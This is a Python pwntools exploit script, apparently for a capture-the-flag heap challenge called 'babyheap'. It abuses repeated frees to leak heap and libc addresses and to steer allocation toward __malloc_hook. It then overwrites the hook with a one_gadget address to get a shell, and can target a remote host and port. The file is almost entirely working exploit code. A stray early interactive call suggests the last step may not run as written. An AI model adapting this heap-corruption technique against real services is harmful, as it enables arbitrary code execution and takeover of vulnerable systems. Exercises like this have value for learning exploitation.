from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'
FILE_NAME = "./babyheap"
"""
HOST = "114.177.250.4"
PORT = 2223
"""
HOST = "localhost"
PORT = 7777

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_stack_chk_fail = elf.got["__stack_chk_fail"]

libc = ELF('./libc.so.6')
off_libc_start = libc.symbols["__libc_start_main"]
off_free_hook = libc.symbols["__free_hook"]
off_malloc_hook = libc.symbols["__malloc_hook"]

#
main_addr = elf.symbols["main"]
menu_addr = elf.symbols["menu"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
got_libc_start = 0x601ff0
ctor = 0x601e10
dtor = 0x601e18

def write_data(size, data):
	conn.sendlineafter(">", "1")
	conn.sendlineafter(" :", str(size))
	conn.sendlineafter(" :", data)

def read_data(index):
	conn.sendlineafter(">", "2")
	conn.sendlineafter(" :", str(index))

def free_data(index):
	conn.sendlineafter(">", "3")
	conn.sendlineafter(" :", str(index))

def exploit():
	src_bufsize = 0x108
	addr_target = got_stack_chk_fail - src_bufsize

	off_chk_x1000 = 0x250
	off_stdinbuf = 0x250 + 0x1010
	off_first_chk = 0x250 + 0x1010 + 0x410 + 0x10 +0xc00
	name = "B"*0x10
	name += p64(got_libc_start)
	write_data(0x68, name)
	free_data(0)
	free_data(0)
	free_data(0)

	read_data(0)
	first_chk = conn.recvuntil("1.")[:-2]
	first_chk = u64(first_chk + "\x00"*(8-len(first_chk)))	
	heap_base = first_chk - off_first_chk	
	chk_x1000 = heap_base + off_chk_x1000 + 0x10
	
	diff = (first_chk+0x10-chk_x1000)/8	
	read_data(diff)
	
	libc_start_main = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_start_main - off_libc_start
	libc_free_hook = libc_base + off_free_hook	
	libc_malloc_hook = libc_base + off_malloc_hook	
	target_chk = libc_malloc_hook -0x20 -0x3 +0x10	
	
	one_gadget = libc_base + gadget[1]
	
	name = "B"*0x10
	name += p64(target_chk)
	write_data(0x68, name)
	free_data(0)	
	free_data(0)	
	free_data(diff)
	
	conn.interactive()	
	payload = "a"*(0x10+0x3)
	payload += p64(one_gadget)
	write_data(0x68, payload)

	print hex(first_chk)
	print hex(heap_base)
	print hex(libc_base)
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
